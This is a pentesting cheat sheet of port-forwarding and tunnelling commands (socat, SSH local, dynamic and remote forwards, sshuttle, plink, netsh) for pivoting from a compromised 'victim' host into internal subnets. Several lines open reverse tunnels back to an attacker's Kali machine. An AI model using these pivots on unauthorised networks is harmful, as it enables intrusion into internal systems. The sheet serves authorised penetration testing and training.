# Port Forwarding & Tunneling Cheat Sheet

## **LINUX**

### **Socat Simple Port Forwarding**
Forwards traffic from a local port to a target IP and port.
```bash
socat -ddd TCP-LISTEN:LOCAL_PORT,fork TCP:TARGET_IP:TARGET_PORT
```

### **SSH Local Port Forwarding**
Opens a port on the client, routes traffic through the SSH server, and sends it to the target.
```bash
ssh -L 8080:10.4.50.215:80 user@192.168.50.64
```

### **SSH Dynamic Port Forwarding**
Exploited a machine in the internal network there is another machine with ssh server there are more machines behind it. SSH from victim to SSH server.
Port will open on victim.
This gave access to a deeper sub-network.
This can open to all the hosts and ports that the server has access to.
Creates a SOCKS proxy that allows access to multiple hosts and ports the SSH server has access to.
Modify `proxychains4.conf` to use it with ProxyChains.
```bash
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

### **SSH Remote Port Forwarding**
Forwards a port from the victim machine to the attacker's machine (SSH server), allowing access to an internal service.
```bash
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

### **SSH Remote Dynamic Port Forwarding**
Works like Local Dynamic Port Forwarding but opens the port on the SSH client (victim), allowing access to its subnet.
```bash
ssh -N -R 9998 kali@192.168.118.4
```

### **sshuttle (VPN-like Access to a Subnet)**
This is going to give VPN like access to a subnets
No need for proxychains.
Needs root on client and needs python3 on server.
In the example we say before first setup socat for getting direct possible ssh to database_admin on PostgreSQL server. Then, use shuttle to get the sub net behind PostgreSQL server.
```bash
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

---

## **WINDOWS**

### **ssh.exe (Windows SSH Client)**

### **Plink (PuTTY Link)**
Command-line SSH client for Windows when OpenSSH is not installed. Download the binary on the victim machine.
```bash
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

### **Netsh Port Forwarding (Requires Admin)**
Not ideal for CTFs or pentesting due to firewall restrictions.
Opens a port on the victim and sends it to the specified target.
```powershell
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=TARGET_IP connectport=4444
```
**Note:** You'll need to allow the port in the firewall:
```powershell
netsh advfirewall firewall add rule name="Open Port 4444" dir=in action=allow protocol=TCP localport=4444
```

---

## **🔹 Quick Reference Table**

| Option | Port Opens On | Purpose |
|--------|-------------|---------|
| `-L` | **Local (Client)** | Forward a port on your machine to a remote service. |
| `-R` | **Remote (SSH Server)** | Forward a port on the SSH server to your local machine. |
| `-D` | **Local (Client)** | Create a SOCKS proxy for dynamic tunneling. |

---

This cheat sheet is for penetration testers, ethical hackers, and security researchers. 🚀

